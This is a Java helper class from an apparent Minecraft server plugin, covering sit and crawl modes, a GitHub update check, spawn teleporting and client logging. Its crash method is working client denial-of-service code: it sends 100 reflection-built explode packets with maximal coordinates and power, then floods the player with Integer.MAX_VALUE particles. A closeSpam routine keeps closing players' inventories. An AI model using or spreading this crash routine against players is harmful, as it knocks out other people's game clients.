package cz.qery.toolkit.helper;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import cz.qery.toolkit.Main;
import net.minecraft.core.BlockPos;
import net.minecraft.core.particles.ParticleTypes;
import net.minecraft.core.registries.BuiltInRegistries;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.world.level.Explosion;
import net.minecraft.world.phys.Vec3;
import org.bukkit.*;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.metadata.FixedMetadataValue;

import java.lang.reflect.Constructor;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.*;

public class Other {
    public static HashMap<UUID, Location[]> bMap = new HashMap<>();
    static Main plugin = Main.getPlugin(Main.class);
    static String b = Main.colors.get("b");
    static String n = Main.colors.get("n");
    static String t = Main.colors.get("t");
    static String h = Main.colors.get("h");

    public static void cleanup(Player p) {
        // Sit check
        if (!Objects.equals(p.getMetadata("sit").toString(), "[]")) {
            if (p.getMetadata("sit").getFirst().asInt() != 0) {
                Location loc = new Location(p.getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY(), p.getLocation().getBlockZ(), p.getLocation().getYaw(), p.getLocation().getPitch());
                for (Entity ent : loc.getChunk().getEntities()) {
                    if (ent.getEntityId() == p.getMetadata("sit").getFirst().asInt()) {
                        ent.remove();
                    }
                }
            }
        }

        // Crawl check
        if (!Objects.equals(p.getMetadata("crawl").toString(), "[]")) {
            if (p.getMetadata("crawl").getFirst().asBoolean()) {
                bDisable(p, false);
            }
        }

        // AntiLeave
        p.setMetadata("closespam", new FixedMetadataValue(plugin, false));

        // Client
        p.removeMetadata("client", plugin);
        p.removeMetadata("trueclient", plugin);
    }

    public static void sCheck(Player p) {
        Location loc = p.getLocation();
        for (Entity ent : loc.getChunk().getEntities()) {
            if (ent.getEntityId() == p.getMetadata("sit").getFirst().asInt()) {
                ent.remove();

                p.teleport(loc.add(0, 1.7, 0));
                p.setMetadata("sit", new FixedMetadataValue(plugin, 0));
                p.sendMessage(Tools.chat(b + "[" + n + "SIT" + b + "]" + t + " Sit mode has been turned &cOFF" + t + "!"));
            }
        }
    }

    @SuppressWarnings("deprecation")
    public static void bCheck(Player p) {

        if (!bMap.containsKey(p.getUniqueId())) {
            return;
        }

        Location pH = new Location(p.getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY() + 1, p.getLocation().getBlockZ());
        Location[] locations = bMap.get(p.getUniqueId());

        for (Location location : locations) {
            if (location.getBlock().getType() == Material.BARRIER) {
                location.getBlock().setType(Material.AIR);
            }
        }

        Location d1 = new Location(p.getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY() - 1, p.getLocation().getBlockZ());
        Location d2 = new Location(p.getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY() - 2, p.getLocation().getBlockZ());

        if (d1.getBlock().isEmpty() && d2.getBlock().isEmpty() || (p.isOnGround() && p.getLocation().getY() % 1 > 0.25)) {
            bDisable(p, true);
            return;
        }

        if (pH.getBlock().isEmpty()) {
            pH.getBlock().setType(Material.BARRIER);
            bMap.replace(p.getUniqueId(), new Location[]{pH});
        }
    }

    public static void bDisable(Player p, Boolean self) {
        Location pH = new Location(p.getWorld(), p.getLocation().getBlockX(), p.getLocation().getBlockY() + 1, p.getLocation().getBlockZ());

        p.setMetadata("crawl", new FixedMetadataValue(plugin, false));
        p.sendMessage(Tools.chat(b + "[" + n + "CRAWL" + b + "]" + t + " Crawl mode has been turned &cOFF" + t + "!"));

        if (!self) {
            Other.bCheck(p);
        }

        Other.bMap.remove(p.getUniqueId());
        if (pH.getBlock().getType() == Material.BARRIER) {
            pH.getBlock().setType(Material.AIR);
        }
    }

    @SuppressWarnings("deprecation")
    public static void checkForUpdate() {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder().GET().uri(URI.create("https://api.github.com/repos/czQery/ToolKit/releases/latest")).build();
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            JsonObject json = JsonParser.parseString(response.body()).getAsJsonObject();
            String version = Objects.requireNonNull(Bukkit.getServer().getPluginManager().getPlugin("ToolKit")).getDescription().getVersion();
            if (!("v" + version).equals(json.get("tag_name").getAsString())) {
                Tools.log(b + "[" + n + "ToolKit" + b + "]");
                Tools.log(b + "- " + t + "Latest version " + h + json.get("tag_name").getAsString().replaceFirst("v", ""));
                Tools.log(b + "- " + t + "This version " + h + version);
                Tools.log(b + "- " + t + "Download newer version from GitHub " + h + "https://github.com/czQery/ToolKit/releases");
            }
        } catch (Exception e) {
            Tools.log(b + "[" + n + "ToolKit" + b + "] &cAPI version check failed");
        }
    }

    public static void crash(Player p) throws InterruptedException {
        ServerPlayer entity = ((CraftPlayer) p).getHandle();
        Location loc = p.getLocation();

        List<BlockPos> list = new ArrayList<>();
        list.add(new BlockPos(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ()));
        Vec3 vec = new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);

        Constructor<?> packetCons = null;
        try {
            for (Constructor<?> c : ClientboundExplodePacket.class.getConstructors()) {
                if (c.getParameterCount() == 10) {
                    packetCons = c;
                    break;
                }
            }
        } catch (Exception ignored) {
        }

        if (packetCons != null) {
            try {
                Object soundArg = (packetCons.getParameterTypes()[9] == net.minecraft.core.Holder.class)
                        ? BuiltInRegistries.SOUND_EVENT.wrapAsHolder(SoundEvents.EMPTY)
                        : SoundEvents.EMPTY;

                Object packet = packetCons.newInstance(
                        Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                        Float.MAX_VALUE,
                        list,
                        vec,
                        Explosion.BlockInteraction.KEEP,
                        ParticleTypes.EXPLOSION,
                        ParticleTypes.EXPLOSION,
                        soundArg
                );

                for (int i = 0; i < 100; i++) {
                    entity.connection.send((ClientboundExplodePacket) packet);
                }
            } catch (Exception ignored) {
            }
        }

        Thread.sleep(500);

        Particle[] particles = {
                Particle.EXPLOSION,
                Particle.TOTEM_OF_UNDYING,
                Particle.SMOKE,
                Particle.WHITE_SMOKE,
                Particle.LARGE_SMOKE,
                Particle.CAMPFIRE_COSY_SMOKE,
                Particle.CAMPFIRE_SIGNAL_SMOKE,
                Particle.CLOUD,
                Particle.CRIT,
                Particle.ENCHANTED_HIT,
                Particle.SCULK_CHARGE_POP,
                Particle.FALLING_SPORE_BLOSSOM
        };

        for (int i = 0; i < 100; i++) {
            for (Particle particle : particles) {
                try {
                    p.spawnParticle(particle, loc, Integer.MAX_VALUE);
                } catch (Exception ignored) {
                }
            }
        }
    }

    public static void addTrueClient(Player p, String client) {
        if (Objects.equals(p.getMetadata("client").toString(), "[]")) {
            p.setMetadata("client", new FixedMetadataValue(plugin, client));
            Tools.log(b + "[" + n + "SERVER" + b + "] " + h + p.getName() + t + " client " + h + client);
        } else if (Objects.equals(p.getMetadata("trueclient").toString(), "[]") && !p.getMetadata("client").getFirst().asString().equalsIgnoreCase(client)) {
            p.setMetadata("trueclient", new FixedMetadataValue(plugin, client));
            Tools.log(b + "[" + n + "SERVER" + b + "] " + h + p.getName() + t + " true client " + h + client);
        }
    }

    public static Location spawnTeleport(Player p) {
        World world = plugin.getServer().getWorld(Objects.requireNonNull(plugin.getConfig().getString("spawn.world")));
        if (world == null) {
            Tools.log(b + "[" + n + "SERVER" + b + "] " + t + "Spawn has invalid world " + h + plugin.getConfig().getString("spawn.world"));
        } else {
            double x = world.getSpawnLocation().getX() + 0.5;
            double y = world.getSpawnLocation().getY() + 0.5;
            double z = world.getSpawnLocation().getZ() + 0.5;
            Location location = new Location(world, x, y, z);
            p.teleport(location);
            return location;
        }
        return null;
    }

    public static void closeSpam() {
        List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());
        for (Player p : players) {
            if (!Objects.equals(p.getMetadata("closespam").toString(), "[]")) {
                if (p.getMetadata("closespam").getFirst().asBoolean()) {
                    p.closeInventory();
                }
            }
        }
    }

    public static class Tools {
        @SuppressWarnings("deprecation")
        public static String chat(String message) {
            return ChatColor.translateAlternateColorCodes('&', message);
        }

        public static void log(String message) {
            Bukkit.getConsoleSender().sendMessage(chat(message));
        }
    }
}
